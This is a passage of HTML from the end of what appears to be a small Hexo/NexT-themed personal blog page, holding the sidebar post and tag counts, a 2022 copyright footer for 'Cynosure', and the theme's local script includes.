  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">5</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">5</span>
        <span class="site-state-item-name">tags</span></a>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2022</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Cynosure</span>
</div>

        








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  

</body>
</html>
